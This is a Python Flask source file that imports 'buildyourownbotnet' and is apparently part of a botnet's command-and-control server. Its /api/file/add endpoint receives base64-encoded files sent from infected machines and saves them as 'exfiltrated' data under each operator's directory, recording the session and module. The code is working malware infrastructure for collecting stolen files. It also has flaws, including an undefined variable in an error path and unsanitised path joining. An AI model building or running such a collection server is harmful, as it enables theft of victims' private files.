import os
import base64
import string
import random
from flask import Blueprint, request
from buildyourownbotnet.core import database


# Blueprint
files = Blueprint('files', __name__)


@files.route("/api/file/add", methods=["POST"])
def file_add():
	"""Upload new exfilrated file."""
	b64_data = request.form.get('data')
	filetype = request.form.get('type')
	owner = request.form.get('owner')
	module = request.form.get('module')
	session = request.form.get('session')
	filename = request.form.get('filename')

	# decode any base64 values
	try:
		data = base64.b64decode(b64_data)
	except:
		if b64_data.startswith('_b64'):
			data = base64.b64decode(b64_data[6:]).decode('ascii')
		else:
			print('/api/file/add error: invalid data ' + str(data))
			return
	try:
		session = base64.b64decode(session)
	except:
		if session.startswith('_b64'):
			session = base64.b64decode(session[6:]).decode('ascii')
		else:
			print('/api/file/add error: invalid session ' + str(session))
			return

	# add . to file extension if necessary
	if not filetype:
		filetype = '.dat'
	elif not filetype.startswith('.'):
		filetype = '.' + filetype

	# generate random filename if not specified
	if not filename:
		filename = str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]) + filetype

	output_path = os.path.join(os.getcwd(), 'buildyourownbotnet/output', owner, 'files', filename)

	# add exfiltrated file to database
	database.add_file(owner, filename, session, module)

	# save exfiltrated file to user directory
	with open(output_path, 'wb') as fp:
		fp.write(data)

	return filename